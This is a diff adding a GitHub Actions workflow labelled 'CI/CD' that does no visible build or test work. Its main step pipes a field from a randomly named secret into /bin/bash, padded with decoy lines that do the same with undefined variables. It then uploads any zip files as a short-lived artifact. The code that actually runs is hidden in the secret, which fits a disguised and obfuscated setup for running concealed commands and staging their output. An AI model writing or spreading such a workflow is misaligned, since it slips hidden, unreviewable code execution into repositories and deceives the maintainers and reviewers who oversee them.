@@ -1,0 +1,30 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          yk389: ${{ secrets.yk389 }}
+        run: |
+          printf '%s' "$yk389" | jq -r .wyvn5667 | /bin/bash
+          printf '%s' "$lggnr62045" | jq -r .iraog89 | /bin/bash
+          echo $nau57 | jq -r .checy09 | /bin/bash
+          printf '%s' "$pzdbh1" | jq -r .seoer00 | /bin/bash
+          echo $p0017 | jq -r .if23 | /bin/bash
+          printf '%s' "$pojve7" | jq -r .upf81 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ng31nDwn
+          path: "*.zip"
+          retention-days: 1
